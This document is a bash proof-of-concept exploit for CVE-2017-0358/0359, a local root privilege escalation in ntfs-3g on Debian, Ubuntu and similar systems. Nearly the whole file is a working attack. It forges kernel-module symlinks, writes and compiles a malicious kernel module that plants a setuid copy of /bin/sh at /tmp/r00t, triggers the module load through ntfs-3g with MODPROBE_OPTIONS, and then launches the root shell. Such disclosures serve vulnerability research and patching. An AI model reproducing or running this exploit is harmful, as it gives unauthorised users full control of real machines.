#!/bin/bash
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"
echo "@  ntfs-3g local privilege escalation to root     @"
echo "@  Credits to Google Project Zero                 @"
echo "@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"
echo "@  Tested: Debian 9 (Stretch)                     @"
echo "@  Date: 2017-02-03                               @"
echo "@  Link: https://goo.gl/A9I8Vq                    @"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "[*] Gathering environment info ..."
cwd="$(pwd)"
un="$(uname -r)"
dlm="$(pwd)/lib/modules"
dkf="$(pwd)/kernel/fs"
echo "[*] Creating kernel hijack directories ..."
mkdir -p "${dlm}"
mkdir -p "${dkf}"
echo "[*] Forging symlinks ..."
ln -sf "${cwd}" "${dlm}/${un}"
ln -sf "${cwd}" "${dkf}/fuse"
ln -sf cve_2017_0358.ko fuse.ko
echo "[*] Pulling in deps ... "
echo "[*] Building kernel module ... "

cat << 'EOF' > cve_2017_0358.c
#include <linux/module.h>

MODULE_LICENSE("CC");
MODULE_AUTHOR("kristian erik hermansen
<kristian.hermansen+CVE-2017-0358@...il.com>");
MODULE_DESCRIPTION("PoC for CVE-2017-0358 from Google Project Zero");

int init_module(void) {
  printk(KERN_INFO "[!] Exploited CVE-2017-0358 successfully; may want
to patch your system!\n");
  char *envp[] = { "HOME=/tmp", NULL };
  char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/r00t;
/bin/chmod u+s /tmp/r00t", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod cve_2017_0358", NULL };
  call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);
  return 0;
}

void cleanup_module(void) {
  printk(KERN_INFO "[*] CVE-2017-0358 exploit unloading ...\n");
}
EOF

cat << 'EOF' > Makefile
obj-m += cve_2017_0358.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

make 1>/dev/null 2>/dev/null || echo "[-] FAILED: your need make / build tools"
cp "/lib/modules/${un}/modules.dep.bin" . || echo "[-] FAILED:
linux-image location non-default?"
MODPROBE_OPTIONS="-v -d ${cwd}" ntfs-3g /dev/null /dev/null
1>/dev/null 2>/dev/null
/tmp/r00t -c 'whoami' | egrep -q 'root' && echo "[+] SUCCESS: You have
root. Don't be evil :)"
/tmp/r00t

echo << 'EOF'
